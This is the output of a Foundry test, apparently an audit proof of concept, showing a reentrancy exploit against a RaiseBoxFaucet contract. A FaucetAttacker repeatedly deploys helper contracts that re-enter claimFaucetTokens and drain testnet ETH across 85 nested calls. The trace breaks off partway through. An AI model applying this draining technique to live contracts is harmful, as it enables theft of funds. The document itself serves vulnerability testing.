No files changed, compilation skipped

Ran 1 test for test/RaiseBoxFaucet.t.sol:TestRaiseBoxFaucet
[PASS] testReentrancyVulnerabilityOnClaimFaucetTokens() (gas: 27026351)
Logs:
  --------START Attack--------
  contract counter:  1
  contract counter:  2
  contract counter:  3
  contract counter:  4
  contract counter:  5
  contract counter:  6
  contract counter:  7
  contract counter:  8
  contract counter:  9
  contract counter:  10
  contract counter:  11
  contract counter:  12
  contract counter:  13
  contract counter:  14
  contract counter:  15
  contract counter:  16
  contract counter:  17
  contract counter:  18
  contract counter:  19
  contract counter:  20
  contract counter:  21
  contract counter:  22
  contract counter:  23
  contract counter:  24
  contract counter:  25
  contract counter:  26
  contract counter:  27
  contract counter:  28
  contract counter:  29
  contract counter:  30
  contract counter:  31
  contract counter:  32
  contract counter:  33
  contract counter:  34
  contract counter:  35
  contract counter:  36
  contract counter:  37
  contract counter:  38
  contract counter:  39
  contract counter:  40
  contract counter:  41
  contract counter:  42
  contract counter:  43
  contract counter:  44
  contract counter:  45
  contract counter:  46
  contract counter:  47
  contract counter:  48
  contract counter:  49
  contract counter:  50
  contract counter:  51
  contract counter:  52
  contract counter:  53
  contract counter:  54
  contract counter:  55
  contract counter:  56
  contract counter:  57
  contract counter:  58
  contract counter:  59
  contract counter:  60
  contract counter:  61
  contract counter:  62
  contract counter:  63
  contract counter:  64
  contract counter:  65
  contract counter:  66
  contract counter:  67
  contract counter:  68
  contract counter:  69
  contract counter:  70
  contract counter:  71
  contract counter:  72
  contract counter:  73
  contract counter:  74
  contract counter:  75
  contract counter:  76
  contract counter:  77
  contract counter:  78
  contract counter:  79
  contract counter:  80
  contract counter:  81
  contract counter:  82
  contract counter:  83
  contract counter:  84
  contract counter:  85
  gas used:  26034758
  gas limit: 1073741824

Traces:
  [27026351] TestRaiseBoxFaucet::testReentrancyVulnerabilityOnClaimFaucetTokens()
    ├─ [0] VM::deal(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], 100000000000000000000 [1e20])
    │   └─ ← [Return]
    ├─ [0] VM::startPrank(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e])
    │   └─ ← [Return]
    ├─ [918535] → new FaucetAttacker@0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a
    │   ├─ emit OwnershipTransferred(previousOwner: 0x0000000000000000000000000000000000000000, newOwner: attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e])
    │   └─ ← [Return] 4356 bytes of code
    ├─ [26033947] FaucetAttacker::attack()
    │   ├─ [0] console::log("--------START Attack--------") [staticcall]
    │   │   └─ ← [Stop]
    │   ├─ [26029715] RaiseBoxFaucet::claimFaucetTokens()
    │   │   ├─ [25911538] FaucetAttacker::receive{value: 5000000000000000}()
    │   │   │   ├─ [516] RaiseBoxFaucet::sepEthAmountToDrip() [staticcall]
    │   │   │   │   └─ ← [Return] 5000000000000000 [5e15]
    │   │   │   ├─ [380] RaiseBoxFaucet::getContractSepEthBalance() [staticcall]
    │   │   │   │   └─ ← [Return] 995000000000000000 [9.95e17]
    │   │   │   ├─ [220299] → new SingleAttackContract@0x9F96E1Bd8579e11Dc6D012945b65C954738b00a2
    │   │   │   │   └─ ← [Return] 877 bytes of code
    │   │   │   ├─ [0] console::log("contract counter: ", 1) [staticcall]
    │   │   │   │   └─ ← [Stop]
    │   │   │   ├─ [25610354] SingleAttackContract::callFaucet()
    │   │   │   │   ├─ [25609595] RaiseBoxFaucet::claimFaucetTokens()
    │   │   │   │   │   ├─ [25573427] SingleAttackContract::receive{value: 5000000000000000}()
    │   │   │   │   │   │   ├─ [25565769] FaucetAttacker::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   ├─ [516] RaiseBoxFaucet::sepEthAmountToDrip() [staticcall]
    │   │   │   │   │   │   │   │   └─ ← [Return] 5000000000000000 [5e15]
    │   │   │   │   │   │   │   ├─ [380] RaiseBoxFaucet::getContractSepEthBalance() [staticcall]
    │   │   │   │   │   │   │   │   └─ ← [Return] 990000000000000000 [9.9e17]
    │   │   │   │   │   │   │   ├─ [220299] → new SingleAttackContract@0x7AA46c743c9a381a371847B04e5e6ABD030198c1
    │   │   │   │   │   │   │   │   └─ ← [Return] 877 bytes of code
    │   │   │   │   │   │   │   ├─ [0] console::log("contract counter: ", 2) [staticcall]
    │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   ├─ [25308385] SingleAttackContract::callFaucet()
    │   │   │   │   │   │   │   │   ├─ [25307626] RaiseBoxFaucet::claimFaucetTokens()
    │   │   │   │   │   │   │   │   │   ├─ [25271458] SingleAttackContract::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   ├─ [25263800] FaucetAttacker::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   ├─ [516] RaiseBoxFaucet::sepEthAmountToDrip() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5000000000000000 [5e15]
    │   │   │   │   │   │   │   │   │   │   │   ├─ [380] RaiseBoxFaucet::getContractSepEthBalance() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 985000000000000000 [9.85e17]
    │   │   │   │   │   │   │   │   │   │   │   ├─ [220299] → new SingleAttackContract@0x3cEFc5F335527EFeA6a15C91Df9Ec4Ad36A57995
    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 877 bytes of code
    │   │   │   │   │   │   │   │   │   │   │   ├─ [0] console::log("contract counter: ", 3) [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   ├─ [25006416] SingleAttackContract::callFaucet()
    │   │   │   │   │   │   │   │   │   │   │   │   ├─ [25005657] RaiseBoxFaucet::claimFaucetTokens()
    │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [24969489] SingleAttackContract::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [24961831] FaucetAttacker::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [516] RaiseBoxFaucet::sepEthAmountToDrip() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5000000000000000 [5e15]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [380] RaiseBoxFaucet::getContractSepEthBalance() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 980000000000000000 [9.8e17]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [220299] → new SingleAttackContract@0x6AF65cEF0EEfc76e77a14aaB10265cf179B17270
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 877 bytes of code
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [0] console::log("contract counter: ", 4) [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [24704447] SingleAttackContract::callFaucet()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [24703688] RaiseBoxFaucet::claimFaucetTokens()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [24667520] SingleAttackContract::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [24659862] FaucetAttacker::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [516] RaiseBoxFaucet::sepEthAmountToDrip() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5000000000000000 [5e15]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [380] RaiseBoxFaucet::getContractSepEthBalance() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 975000000000000000 [9.75e17]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [220299] → new SingleAttackContract@0x6dfE4608c4cF2Bc1A87ACf0892129e4aCB6FAd35
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 877 bytes of code
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [0] console::log("contract counter: ", 5) [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [24402478] SingleAttackContract::callFaucet()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [24401719] RaiseBoxFaucet::claimFaucetTokens()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [24365551] SingleAttackContract::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [24357893] FaucetAttacker::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [516] RaiseBoxFaucet::sepEthAmountToDrip() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5000000000000000 [5e15]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [380] RaiseBoxFaucet::getContractSepEthBalance() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 970000000000000000 [9.7e17]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [220299] → new SingleAttackContract@0x6F102c5099fAd687FFA8cF42dfeAC44b8e5D3e86
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 877 bytes of code
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [0] console::log("contract counter: ", 6) [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [24100509] SingleAttackContract::callFaucet()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [24099750] RaiseBoxFaucet::claimFaucetTokens()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [24063582] SingleAttackContract::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [24055924] FaucetAttacker::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [516] RaiseBoxFaucet::sepEthAmountToDrip() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5000000000000000 [5e15]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [380] RaiseBoxFaucet::getContractSepEthBalance() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 965000000000000000 [9.65e17]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [220299] → new SingleAttackContract@0x419A6aB0fc3d823ec261Da8582F81ccF291B238c
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 877 bytes of code
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [0] console::log("contract counter: ", 7) [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [23798540] SingleAttackContract::callFaucet()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [23797781] RaiseBoxFaucet::claimFaucetTokens()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [23761613] SingleAttackContract::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [23753955] FaucetAttacker::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [516] RaiseBoxFaucet::sepEthAmountToDrip() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5000000000000000 [5e15]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [380] RaiseBoxFaucet::getContractSepEthBalance() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 960000000000000000 [9.6e17]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [220299] → new SingleAttackContract@0xfFa7d948b93BF146c1d0F7d0216a10fE3904372C
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 877 bytes of code
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [0] console::log("contract counter: ", 8) [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [23496571] SingleAttackContract::callFaucet()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [23495812] RaiseBoxFaucet::claimFaucetTokens()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [23459644] SingleAttackContract::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [23451986] FaucetAttacker::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [516] RaiseBoxFaucet::sepEthAmountToDrip() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5000000000000000 [5e15]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [380] RaiseBoxFaucet::getContractSepEthBalance() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 955000000000000000 [9.55e17]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [220299] → new SingleAttackContract@0x4f2ba2fD48ef2Df53dc47709d7dAd7915AA97d07
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 877 bytes of code
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [0] console::log("contract counter: ", 9) [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [23194602] SingleAttackContract::callFaucet()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [23193843] RaiseBoxFaucet::claimFaucetTokens()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [23157675] SingleAttackContract::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [23150017] FaucetAttacker::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [516] RaiseBoxFaucet::sepEthAmountToDrip() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5000000000000000 [5e15]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [380] RaiseBoxFaucet::getContractSepEthBalance() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 950000000000000000 [9.5e17]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [220299] → new SingleAttackContract@0x2E66Ca7d826A0aeDFDBda2c33e1E9F95C3622Cc1
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 877 bytes of code
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [0] console::log("contract counter: ", 10) [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [22892633] SingleAttackContract::callFaucet()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [22891874] RaiseBoxFaucet::claimFaucetTokens()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [22855706] SingleAttackContract::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [22848048] FaucetAttacker::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [516] RaiseBoxFaucet::sepEthAmountToDrip() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5000000000000000 [5e15]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [380] RaiseBoxFaucet::getContractSepEthBalance() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 945000000000000000 [9.45e17]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [220299] → new SingleAttackContract@0x01dd7F18F25ED6E7958B516b43794b193248D12e
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 877 bytes of code
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [0] console::log("contract counter: ", 11) [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [22590664] SingleAttackContract::callFaucet()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [22589905] RaiseBoxFaucet::claimFaucetTokens()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [22553737] SingleAttackContract::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [22546079] FaucetAttacker::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [516] RaiseBoxFaucet::sepEthAmountToDrip() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5000000000000000 [5e15]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [380] RaiseBoxFaucet::getContractSepEthBalance() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 940000000000000000 [9.4e17]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [220299] → new SingleAttackContract@0x19C76619f20999404fCD293d142A3E32520205eC
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 877 bytes of code
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [0] console::log("contract counter: ", 12) [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [22288695] SingleAttackContract::callFaucet()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [22287936] RaiseBoxFaucet::claimFaucetTokens()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [22251768] SingleAttackContract::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [22244110] FaucetAttacker::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [516] RaiseBoxFaucet::sepEthAmountToDrip() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5000000000000000 [5e15]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [380] RaiseBoxFaucet::getContractSepEthBalance() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 935000000000000000 [9.35e17]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [220299] → new SingleAttackContract@0xf239595bf117Ab87aCF991d545f567e8CE7B69ee
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 877 bytes of code
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [0] console::log("contract counter: ", 13) [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [21986726] SingleAttackContract::callFaucet()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [21985967] RaiseBoxFaucet::claimFaucetTokens()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [21949799] SingleAttackContract::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [21942141] FaucetAttacker::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [516] RaiseBoxFaucet::sepEthAmountToDrip() [staticcall]
